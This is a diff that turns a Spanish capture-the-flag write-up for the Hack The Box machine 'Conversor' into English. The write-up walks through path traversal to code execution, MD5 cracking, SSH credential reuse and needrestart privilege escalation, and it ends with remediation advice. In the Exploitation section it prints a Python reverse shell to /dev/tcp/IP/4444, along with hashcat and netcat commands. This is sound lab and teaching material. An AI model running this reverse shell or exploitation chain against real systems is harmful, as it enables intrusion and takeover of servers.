@@ -1,47 +1,45 @@
 ---
-title: "WriteUp: Conversor | HTB"
-date: 2026-05-24
-draft: false
-tags:
-  - Linux
-  - Web
-  - Caido
-  - Path-traversal
-  - GTFObins
-  - SUID
-  - CVE-2024-48990
-categories:
-  - WriteUps
 author: MaxisFront
-description: "HTB Conversor Machine | Desafío creado por: FisMatHack"
-image: Conversor_Shield.png
+categories:
+- WriteUps
+date: 2026-05-24
+description: 'HTB Converter Machine | Challenge created by: FisMatHack'
+draft: false
 hideReadingTime: false
+image: Conversor_Shield.png
+tags:
+- Linux
+- Web
+- Caido
+- Path-traversal
+- GTFObins
+- SUID
+- CVE-2024-48990
+title: 'WriteUp: Converter | HTB'
 ---
-> Todos los derechos reservados a la **Hack The Box LTD**.
-
+> All rights reserved by **Hack The Box LTD**.
 
 {{< alert info >}}
 
-> Resumen
+> Summary
 
-- Explotación de `Path Traversañ` para obtener capacidad de `RCE`
--  Extracción y crackeo de hashes `MD5` mediante `Hashcat`
-- Reutilización de credenciales para el acceso por `SSH`
-- Aprovechamiento de SUID del comando `needrestart` (`CVE-2024-48990`)
-- Recomendaciones de seguridad para prevenir y mitigar las vulnerabilidades de esta máquina.
+- Exploitation of `Path Traversañ` to gain `RCE`
+- Extraction and cracking of hashes `MD5` via `Hashcat`
+- Reuse of credentials for access via `SSH`
+- Exploitation of the command's SUID `needrestart` (`CVE-2024-48990`)
+- Security recommendations to prevent and mitigate vulnerabilities on this machine.
 
 {{< /alert>}}
 
-#### Habilidades Empleadas
+#### Skills Used
 
-  
-- Enumeración de puertos
-- Uso de comandos básicos basados en GNU/Linux
-- Explotación por medio de  UFU y RCE
-- Búsqueda y uso de CVE Crítico
-- Aprovechamiento de SUID vulnerable
+- Port enumeration
+- Use of basic GNU/Linux-based commands
+- Exploitation via UFU and RCE
+- Searching for and using Critical CVEs
+- Exploitation of vulnerable SUID
 
-#### Herramientas Utilizadas
+#### Tools Used
 
 - Nmap
 - Caido
@@ -52,104 +50,118 @@ hideReadingTime: false
 - sudo
 - needrestart
 
----
-## Escaneo y Análisis de Vulnerabilidades
+------------------------------------------------------------------------
 
-La plataforma `HTB` nos provee la `IP` objetivo, la cual es la `10.129.12.212`, dirección capaz de ser alcanzada conectándonos a través de la `VPN` que nos asigna la plataforma.
+## Vulnerability Scanning and Analysis
 
-### Reconocimiento de Puertos
+The platform `HTB` provides us with the `IP` target, which is the `10.129.12.212`, an address that can be reached by connecting through the `VPN` assigned to us by the platform.
 
-Realizamos una enumeración  de los 65535 puertos `TCP` del sistema a través de la herramienta `Nmap`, enfocándonos en los de estado abierto:
+### Port Scanning
 
-``` bash
+We perform a scan of the 65,535 ports `TCP` on the system using the tool `Nmap`, focusing on those with an open status:
+
+<div id="cb1" class="sourceCode">
+
+``` sourceCode
 nmap -p- --min-rate 5000 -Pn -n -oN nmap-scan 10.129.12.212
 ```
 
-![Arp-Scan output](./images/1_Conversor-nmap-scan.png)
+</div>
 
-> <= Importante =>
-> En entornos empresariales, enviar grandes cantidades de paquetes `TCP`, `ICMP` o `UDP` suele provocar un congestionamiento  de la red, provocando un ataque `DoS` accidental o ser bloqueados por sistemas de monitorización.
+![Arp-Scan output](images/1_Conversor-nmap-scan.png)
 
-### Enumeración de Puertos
+> \<= Important =\> In enterprise environments, sending large numbers of packets `TCP`, `ICMP` or `UDP` often causes network congestion, leading to an `DoS` or being blocked by monitoring systems.
 
-Observamos que los puertos 22 `(SSH)` y 80 `(HTTP)` se encuentran activos. A partir e este punto podemos enumerar los servicios a través de `Nmap`. 
+### Port Scanning
 
-``` bash
+We observe that ports 22 `(SSH)` and 80 `(HTTP)` are active. From this point, we can enumerate the services through `Nmap`.
+
+<div id="cb2" class="sourceCode">
+
+``` sourceCode
 nmap -sCV -p22,80 -oN ports-enumeration 10.129.12.212
 ```
 
-![Enumerating ports through Nmap](./images/2_Conversor-ports-enumeration.png)
+</div>
 
-Tras un análisis de la enumeración de puertos, podemos agrupar los resultados en la siguiente tabla:
+![Enumerating ports through Nmap](images/2_Conversor-ports-enumeration.png)
 
-| Puerto | Servicio |                            Versión                            |                                                                   Notas                                                                   |
-| :----: | :------: | :-----------------------------------------------------------: | :---------------------------------------------------------------------------------------------------------------------------------------: |
-|   22   |   ssh    | OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0) | Versión desactualizada propensa al **CVE-2016-6210** y al **CVE-2015-5600**, aunque para esta máquina _hay otra aproximación la objetivo_ |
-|   80   |   http   |                      Apache httpd 2.4.52                      |                     El objetivo posiblemente está corriendo un servicio `Apache` desactualizado para un servidor web                      |
-> Herramientas como `whatweb` (Comando) o `Wappalyzer` (Extensión del navegador) son de gran utilidad cuando deseamos conocer únicamente las tecnologías que hay en un servicio http.
+After analyzing the port enumeration, we can summarize the results in the following table:
 
-A partir de la tabla podemos definir posibles vectores de aproximación al objetivo:
+| Port | Service |                            Version                            |                                                                    Notes                                                                    |
+|:----:|:-------:|:-------------------------------------------------------------:|:-------------------------------------------------------------------------------------------------------------------------------------------:|
+|  22  |   ssh   | OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0) | Outdated version vulnerable to **CVE-2016-6210** and **CVE-2015-5600**, although for this machine *there is another approach to the target* |
+|  80  |  http   |                      Apache httpd 2.4.52                      |                                        The target is likely running an `Apache` outdated web server                                         |
 
-> - Puerto 22 (SSH): ervicio `OpenSSH` desactualizado, siendo usado posiblemente por un `Ubuntu 22.04 LTS` (Jammy Jellyfish). Posible enumeración de usuarios a través del `CVE-2016-6210` y ataque de tipo `DoS` (`CVE-2015-5600`). A simple vista no son vías potenciales de acceso directo al equipo.
+> Tools such as `whatweb` (Command) or `Wappalyzer` (Browser extension) are very useful when we want to identify only the technologies present in an HTTP service.
+
+Based on the table, we can define possible attack vectors against the target:
+
+> - Port 22 (SSH): outdated service `OpenSSH` , possibly being used by a `Ubuntu 22.04 LTS` (Jammy Jellyfish). Possible user enumeration via `CVE-2016-6210` and `DoS` (`CVE-2015-5600`). At first glance, these are not potential direct access points to the system.
 >
-> - Puerto 80 (HTTP): Página web de código abierto hosteada por medio de un servicio `Apache httpd 2.4.52` desactualizado. Por medio de una enumeración web es posible encontrar otras vulnerabilidades.
+> - Port 80 (HTTP): Open-source website hosted via an `Apache httpd 2.4.52` . Through web enumeration, it is possible to find other vulnerabilities.
 
-### Enumeración Web
+### Web Enumeration
 
-Previo a acceder a la web del objetivo `Conversor`, se realiza un `mapping` de la IP objetivo a la página de manera temporal. Esto es posible modificando el archivo `/etc/hosts`:
+Before accessing the target’s website `Conversor`, a `mapping` from the target IP to the page is performed temporarily. This is possible by modifying the file `/etc/hosts`:
 
-```bash
+<div id="cb3" class="sourceCode">
+
+``` sourceCode
 sudoedit /etc/hosts
 ```
 
-![Map IP of Conversor into the /etc/hosts files](./images/3_Conversor-map-IP-into-etc-hosts.png)
+</div>
 
-Tras acceder a la página es posible encontrar un panel de sesión. Para acceder creamos un usuario y contraseña.
+![Map IP of Conversor into the /etc/hosts files](images/3_Conversor-map-IP-into-etc-hosts.png)
 
-La página con la dirección `index.html` es una sección donde se permiten subir archivos con extensión `.xml` y `.xslt`, lo cual por si solo se considera un vector de ataque si existe una mala implementación (`CWE-91` y/o `CWE-611`).
+After accessing the page, a login panel can be found. To log in, we create a username and password.
 
-![Submit XML and XSLT files section](./images/4_Conversor-submit-xml-xslt-files.png)
+The page at the address `index.html` is a section where you can upload files with the `.xml` and `.xslt`, which in itself is considered an attack vector if there is a poor implementation (`CWE-91` and/or `CWE-611`).
 
-> Es de destacar que permitir a los usuarios subir archivos `.XSLT` es considerado una posible brecha de seguridad grave, pues un atacante puede insertar código malicioso e insertar referencias a entidades externas a la página (Hágase especial énfasis en las vulnerabilidades `XXE`).
+![Submit XML and XSLT files section](images/4_Conversor-submit-xml-xslt-files.png)
 
-Si nos dirigidos a la dirección `/about` observamos que es posible descargar el código fuente de la página:
+> It is worth noting that allowing users to upload files `.XSLT` is considered a potentially serious security breach, as an attacker can inject malicious code and include references to entities external to the page (Special emphasis should be placed on the vulnerabilities `XXE`).
 
-![About page with a "Download Source Code" button](./images/5_Conversor-download-sourcecode.png)
+If we go to the address `/about` we observe that it is possible to download the website’s source code:
 
-> Esto nos permite analizar la arquitectura de la página web para buscar fallas de seguridad (Como lo sería identificar una falta de sanitización de los archivos subidos por el usuario).
+![About page with a "Download Source Code" button](images/5_Conversor-download-sourcecode.png)
 
-Tras haber descargado y analizado los archivos `app.py` e `install.md` podemos destacar 2 fallas críticas de seguridad:
+> This allows us to analyze the website’s architecture to look for security flaws (such as identifying a lack of sanitization of user-uploaded files).
 
-|                                                                 `Unrestricted File Upload` (app.py)                                                                 |                                       `Cronjob` (install.md)                                       |
-| :-----------------------------------------------------------------------------------------------------------------------------------------------------------------: | :------------------------------------------------------------------------------------------------: |
-| No se realizan validaciones ni sanitizaciones a los nombres de los archivos subidos, permitiendo una manipulación de rutas (Técnica conocida como `Path Traversal`) | Cronjob encargado de ejecutar _todos_ los códigos `python` en el directorio `/scripts` cada minuto |
+After downloading and analyzing the files `app.py` , `install.md` we can highlight two critical security flaws:
 
+|                                                        `Unrestricted File Upload` (app.py)                                                        |                                       `Cronjob` (install.md)                                       |
+|:-------------------------------------------------------------------------------------------------------------------------------------------------:|:--------------------------------------------------------------------------------------------------:|
+| No validation or sanitization is performed on the names of uploaded files, allowing for path manipulation (a technique known as `Path Traversal`) | Cronjob responsible for executing *all* the code `python` in the directory `/scripts` every minute |
 
-![Content of app.py and install.md with the relevant information](./images/6_Conversor-path-traversal-and-cronjob-identification.png)
+![Content of app.py and install.md with the relevant information](images/6_Conversor-path-traversal-and-cronjob-identification.png)
 
-Estas 2 vulnerabilidades podrían permitir una un `RCE` si un atacante fuese capaz de subir un archivo a la dirección `/scripts`.
+These two vulnerabilities could allow an `RCE` if an attacker were able to upload a file to the address `/scripts`.
 
-Como primer paso, intentamos comprobar si es posible realizar un `Path Traversal` a través de peticiones `POST` modificando el parámetro `filename`; para ello, subimos un archivo vacío para intentar modificar una imagen en la dirección `conversor.htb/about`.
+As a first step, we tried to check if it is possible to perform a `Path Traversal` through requests `POST` by modifying the parameter `filename`; to do this, we uploaded an empty file to try to modify an image at the address `conversor.htb/about`.
 
-Utilizando la herramienta `Caido`, interceptamos la petición y la manipulamos:
+Using the tool `Caido`, we intercept the request and manipulate it:
 
-![Testing the Path Traversal through the "Caido" tool](./images/7_Conversor-replace-arturo-image.png)
+![Testing the Path Traversal through the "Caido" tool](images/7_Conversor-replace-arturo-image.png)
 
-> Modificamos el nombre del archivo, de tal manera que pueda desplazarse entre directorios hasta llegar a la sección `/about` y reemplazar la imagen `arturo.png`.
+> We modify the filename so that it can navigate through directories until it reaches the section `/about` and replace the image `arturo.png`.
 
-Tras enviar la petición, observamos que fue posible modificar una imagen en la sección `/about`:
+After sending the request, we observed that it was possible to modify an image in the section `/about`:
 
-![Image modified through a Path Traversal vulnerability](./images/8_Conversor-modify-arturo.png-image.png)
+![Image modified through a Path Traversal vulnerability](images/8_Conversor-modify-arturo.png-image.png)
 
-## Explotación
+## Exploitation
 
-A partir de este punto nos enfocamos en intentar acceder a través de diversos métodos al sistema del equipo `Conversor`.
+From this point on, we focused on attempting to access the computer’s system using various methods `Conversor`.
 
 ### Web
 
-Tras comprobar la existencia de un vector de ataque prometedor, subimos una `revershell` escrita en Python, modificando la ruta para que nuestro código malicioso sea almacenado en el directorio `/scripts`.
+After verifying the existence of a promising attack vector, we uploaded a `revershell` written in Python, modifying the path so that our malicious code would be stored in the directory `/scripts`.
 
-```python
+<div id="cb4" class="sourceCode">
+
+``` sourceCode
 #!/usr/bin/env python3
 
 import os
@@ -157,146 +169,173 @@ import os
 os.system("bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'")
 ```
 
-![Uploading a revershell to the /scritps directory](./images/9_Conversor-revershell-path-traversal.png)
+</div>
 
+![Uploading a revershell to the /scritps directory](images/9_Conversor-revershell-path-traversal.png)
 
-Utilizamos la herramienta `netcat` para entrar en modo escucha en el puerto `4444`. Tras esperar unos segundos, se entabla una conexión con el servidor víctima:
+We use the tool `netcat` to enter listen mode on port `4444`. After waiting a few seconds, a connection is established with the victim server:
 
-```bash
+<div id="cb5" class="sourceCode">
+
+``` sourceCode
 nc -lvnp 4444
 ```
 
-![Establishing connection through netcat](./images/10_Conversor-connection-established-with-conversor.png)
+</div>
 
-Tras obtener acceso, es posible encontrar la base de datos del servidor en la dirección `/var/www/conversor.htb/instance/users.db`. Esta posee la clave de acceso para el usuario `fismathack`, _hasheada_ a través del algoritmo `MD5` (A día de hoy vulnerable).
+![Establishing connection through netcat](images/10_Conversor-connection-established-with-conversor.png)
 
-![User and password inside the "users.db" file](./images/11_Conversor-identifying-user-and-hashed-password.png)
+After gaining access, the server’s database can be found at the address `/var/www/conversor.htb/instance/users.db`. It contains the password for the user `fismathack`, *hashed* using the algorithm `MD5` (currently vulnerable).
 
-Por medio de `hashacat` podemos _crackear_ el hash a través de un `Dictionary Attack` de la siguiente manera:
+![User and password inside the "users.db" file](images/11_Conversor-identifying-user-and-hashed-password.png)
 
-``` bash
+Using `hashacat` we can *crack* the hash using a `Dictionary Attack` as follows:
+
+<div id="cb6" class="sourceCode">
+
+``` sourceCode
 hashcat -m 0 -a 0 hash-fismathack.txt wordlist.txt
 ```
-> - `-m`: especifica el tipo de algoritmo utilizado (En este cas, MD5)
-> - `-a`: específica el método de ataque (En este caso, ataque por diccionario)
+
+</div>
+
+> - `-m`: specifies the type of algorithm used (in this case, MD5)
+> - `-a`: specifies the attack method (in this case, a dictionary attack)
 
 ### SSH
 
-`hashcat` nos devuelve la contraseña del usuario, que es `Keepmesafeandwarm`. Tras ello, podemos intentar comprobar si existe una reutilización de credenciales a través del servicio `SSH`.
+`hashcat` returns the user's password, which is `Keepmesafeandwarm`. After that, we can try to check if there is credential reuse through the service `SSH`.
 
-```bash
+<div id="cb7" class="sourceCode">
+
+``` sourceCode
 ssh fismathack@conversor.htb #Keepmesafeandwarm
 ```
 
-![Access via SSH with the user fismathack](./images/12_Conversor-access-via-ssh-with-fismathack-user.png)
+</div>
 
-Tras acceder como el usuario `fismathack`, comprobamos si tenemos capacidad de ejecutar binarios con permiso `SUID`.
+![Access via SSH with the user fismathack](images/12_Conversor-access-via-ssh-with-fismathack-user.png)
 
-```bash
+After logging in as the user `fismathack`, we check if we have the ability to execute binaries with `SUID`.
+
+<div id="cb8" class="sourceCode">
+
+``` sourceCode
 sudo -l
 ```
 
-![binary with SUID permission](./images/13_Conversor-binaries-with-sudo-permissions.png)
+</div>
+
+![binary with SUID permission](images/13_Conversor-binaries-with-sudo-permissions.png)
 
 ### CVE-2024-48990
 
-Observamos que el usuario `fismathack` puede ejecutar `needrestart` como administrador; una búsqueda rápida a través e la página `GTFObins` indica que este binario puede ejecutar código `perl` malicioso almacenado en un archivo con la extensión `.conf`.
+We observe that the user `fismathack` can run `needrestart` as an administrator; a quick search on the page `GTFObins` shows that this binary can execute `perl` stored in a file with the extension `.conf`.
 
-![Indications to abuse the binary needrestart, from "GTFObins"](./images/14_Conversor-gftobins-needrestart.png)
+![Indications to abuse the binary needrestart, from "GTFObins"](images/14_Conversor-gftobins-needrestart.png)
 
-Creamos un archivo de configuración (Por ejemplo, `test.conf`). De esta manera, al pedirle a `needrestart` que cargue un archivo de _configuración adicional_, ejecute una `shell` heredada con permisos del usuario `root`. 
+We create a configuration file (for example, `test.conf`). This way, when we ask `needrestart` it to load an *additional configuration* file, it executes a `shell` inherited with user permissions `root`.
 
-![Privilege Escalation through the needrestart binary](./images/15_Conversor-privilege-escalation-with-needrestart-binary.png)
+![Privilege Escalation through the needrestart binary](images/15_Conversor-privilege-escalation-with-needrestart-binary.png)
 
-Ahora tenemos una sesión de `bash` como el usuario `root`, tomando control total del sistema `Conversor`.
+Now we have a session `bash` as the user `root`, taking full control of the system `Conversor`.
 
-## Impacto
+## Impact
 
-Un atacante con permisos de un usuario común como `www-data` o `fismathack` tiene capacidades de:
+An attacker with the permissions of a regular user such as `www-data` or `fismathack` has the following capabilities:
 
-> - Capacidad de lectura de archivos de la aplicación web en el directorio `/var/www/conversor.htb`.
-> - Acceso a la base de datos `users.db`, exponiendo credenciales de usuario.
-> - Capacidad de ejecutar `scripts` y establecer sesiones persistentes.
-> - Capacidad de enumerar otros sistemas de la red y de realizar movimiento lateral.
+> - Read files from the web application in the directory `/var/www/conversor.htb`.
+> - Access the database `users.db`, exposing user credentials.
+> - Ability to execute `scripts` and establish persistent sessions.
+> - Ability to enumerate other systems on the network and perform lateral movement.
 
-El atacante con permisos de administrador obtiene las capacidades de:
+An attacker with administrator privileges gains the ability to:
 
-> - Entablar persistencia entre sesiones y controlar el tráfico del servidor.
-> - Manipulación de `cronjobs` para ejecución de tareas maliciosas.
-> - Instalación de `backdoors` a nivel de kernel.
+> - Establishing persistence between sessions and controlling server traffic.
+> - Manipulation of `cronjobs` to execute malicious tasks.
+> - Installation of `backdoors` at the kernel level.
 
-# Resumen
+# Summary
 
-La máquina `Conversor` presentó una serie de vulnerabilidades críticas (**No todas expuestas en este WriteUp**) tales como realizar un `Path Traversal` y posteriormente un `RCE`, así como que se presentó un `Credential Reuse` y explotación de un `SUID`, entre otras más. Por ello,  continuación se expondrán los descubrimientos, su gravedad y pautas para evitar esta clase de fallas de seguridad.
+The machine `Conversor` exhibited a series of critical vulnerabilities (**not all of which are detailed in this WriteUp**), such as performing a `Path Traversal` and subsequently a `RCE`, as well as a `Credential Reuse` and exploitation of a `SUID`, among others. Therefore, the following section will outline the findings, their severity, and guidelines for preventing this type of security breach.
 
-### Descubrimientos
+### Findings
 
+> Unrestricted file uploads and `Path Traversal`
 
-> Carga de archivos sin restricciones y `Path Traversal`
+| ID  |                        **Vulnerability**                        |               **Severity**               |                                                                    Description                                                                    |
+|:---:|:---------------------------------------------------------------:|:----------------------------------------:|:-------------------------------------------------------------------------------------------------------------------------------------------------:|
+| MF1 | CWE-35 and CWE-434: Path Traversal and Unrestricted File Upload | {{< exptag "critica">}} Critical {{</exptag >}} | Lack of sanitization in the parameter `filename` in the code `app.py`, allowing file overwriting and hosting of malicious code in arbitrary paths |
 
-| ID  |                           **Vulnerabilidad**                            |                  **Gravedad**                  |                                                                             Descripción                                                                              |
-| :-: | :---------------------------------------------------------------------: | :--------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
-| MF1 | CWE-35 y CWE-434: Path Traversal y Subida de Archivos Sin Restricciones | {{< exptag "critica">}} Crítica {{</exptag >}} | Falta de sanitización en el parámetro `filename` en el código `app.py`, permitiendo sobrescritura de archivos y alojamiento de código malicioso en rutas arbitrarias |
+{{< alert error >}} Immediate Measures
 
-{{< alert error >}} 
-Medidas inmediatas
-
-> - Implementar funciones que eliminen caracteres que permitan saltos de directorio (`../`) en el nombre del archivo subido.
-> - Implementar un entorno aislado dentro de un contenedor  o entorno _sandbox_.
-> - Validar estrictamente las extensiones, contenido (`Magic Bytes`) y estructura de los archivos subidos (`.xml` y `.xslt`).
+> - Implement functions that remove characters allowing directory traversal (`../`) in the name of the uploaded file.
+> - Implement an isolated environment within a container or *sandbox*.
+> - Strictly validate extensions, content (`Magic Bytes`) and structure of uploaded files (`.xml` and `.xslt`).
 
 {{< /alert>}}
 
+> Exploitation of `XXE` in files `.xslt`
 
-> Explotación de `XXE` en archivos `.xslt`
+| ID  |                      **Vulnerability**                      |               **Severity**               |                                                          Description                                                           |
+|:---:|:-----------------------------------------------------------:|:----------------------------------------:|:------------------------------------------------------------------------------------------------------------------------------:|
+| MF2 | CWE-611: Improper Scoping of XML External Entity References | {{< exptag "critica">}} Critical {{</exptag >}} | Insecure file processing `.xslt`, allowing reading and writing of system files, as well as execution of commands on the server |
 
-| ID  |                             **Vulnerabilidad**                              |                  **Gravedad**                  |                                                                    Descripción                                                                     |
-| :-: | :-------------------------------------------------------------------------: | :--------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------: |
-| MF2 | CWE-611: Restricción Incorrecta de las Referencias a Entidades Externas XML | {{< exptag "critica">}} Crítica {{</exptag >}} | Procesamiento inseguro de archivos `.xslt`, permitiendo lectura y escritura de archivos del sistema, así como ejecución de comandos en el servidor |
+{{< alert error >}} Immediate actions:
 
-{{< alert error >}} 
-Medidas inmediatas:
-
-> - Aplicar un `parser` seguro al procesar archivos `.xslt`, utilizando medidas como `resolve_entities=False`, `no_network=True`.
-> - Establecer un perfil de seguridad estricto, deshabilitando capacidades de lectura de archivos, de escritura y ejecución de comandos dentro del sistema y la red.
+> - Apply a `parser` secure approach when processing files `.xslt`, using measures such as `resolve_entities=False`, `no_network=True`.
+> - Establish a strict security profile, disabling file read, write, and command execution capabilities within the system and network.
 
 {{< /alert>}}
 
+> `Dictionary Attack` against algorithm `MD5`
 
-> `Dictionary Attack` contra algoritmo `MD5`
+| ID  |                              **Vulnerability**                              |              **Severity**              |                          Description                           |
+|:---:|:---------------------------------------------------------------------------:|:--------------------------------------:|:--------------------------------------------------------------:|
+| MF3 | CWE-328 and CWE-522: Weak Hash Usage and Insufficient Credential Protection | {{< exptag "alta">}} High {{</exptag >}} | Credentials exposed in `users.db` and weak `hash` weak (`MD5`) |
 
-| ID  |                               **Vulnerabilidad**                               |               **Gravedad**               |                                   Descripción                                   |
-| :-: | :----------------------------------------------------------------------------: | :--------------------------------------: | :-----------------------------------------------------------------------------: |
-| MF3 | CWE-328 y CWE-522: Uso de Hash Débil y Protección de Credenciales Insuficiente | {{< exptag "alta">}} Alta {{</exptag >}} | Credenciales expuestas en  `users.db` y contraseñas con un `hash` débil (`MD5`) |
+\`
 
+{{< alert error >}} Immediate measures:
 
-{{< alert error >}} 
-Medidas inmediatas:
-
-> - Utilizar funciones criptográficas de `hash` modernas y robustas (Como `Argon2id` o `SHA-512`).
-> - Utilizar mecanismos de `salting` único y aleatorio por cada contraseña nueva generada por el usuario.
+> - Use modern and robust cryptographic functions `hash` modern and robust cryptographic functions (such as `Argon2id` or `SHA-512`).
+> - Use `salting` unique and random for each new password generated by the user.
 
 {{< /alert>}}
 
+> Leveraging `SUID` in the `needrestart`
 
-> Aprovechamiento de `SUID` en el comando `needrestart`
+<table>
+<colgroup>
+<col style="width: 25%" />
+<col style="width: 25%" />
+<col style="width: 25%" />
+<col style="width: 25%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th style="text-align: center;">ID</th>
+<th style="text-align: center;"><strong>Vulnerability</strong></th>
+<th style="text-align: center;"><strong>Severity</strong></th>
+<th style="text-align: center;">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;">MF4</td>
+<td style="text-align: center;">CWE-269: Improper Privilege Handling</td>
+<td style="text-align: center;">{{< exptag "critica">}} Critical {{</exptag >}}</td>
+<td style="text-align: center;">The local user <code>fismathack</code> with execution capabilities <code>needrestart</code>, with the ability to inject code <code>perl</code>, obtaining a <code>shell</code> such as <code>root</code>.<br />
+</td>
+</tr>
+</tbody>
+</table>
 
-| ID  |             **Vulnerabilidad**             |                  **Gravedad**                  |                                                                       Descripción                                                                       |
-| :-: | :----------------------------------------: | :--------------------------------------------: | :-----------------------------------------------------------------------------------------------------------------------------------------------------: |
-| MF4 | CWE-269: Gestión inadecuada de Privilegios | {{< exptag "critica">}} Crítica {{</exptag >}} | El usuario local `fismathack` con capacidad de ejecutar `needrestart`, con capacidad de inyectar código `perl`, obteniendo una `shell` como `root`.<br> |
+{{< alert error >}}
 
-
-{{< alert error >}} 
-
-> Para mitigar las capacidades de un atacante de poder escalar privilegios, se insta a:
+> To mitigate an attacker’s ability to escalate privileges, it is recommended to:
 >
->- Remover permisos de ejecución como administrador al usuario `fismathack` para la ejecución de `needrestart` en el archivo `/etc/sudoers`.
->- En caso de ser estrictamente necesario, restringir el parámetro `-c`, o bien, permitiendo rutas de configuración absolutas, protegidas contra escritura para el usuario `fismathack`.
+> - Remove administrator execution permissions for the user `fismathack` for the execution of `needrestart` the file `/etc/sudoers`.
+> - If strictly necessary, restrict the `-c`, or allow absolute, write-protected configuration paths for the user `fismathack`.
 
 {{< /alert>}}
-
-
-
-
-
-
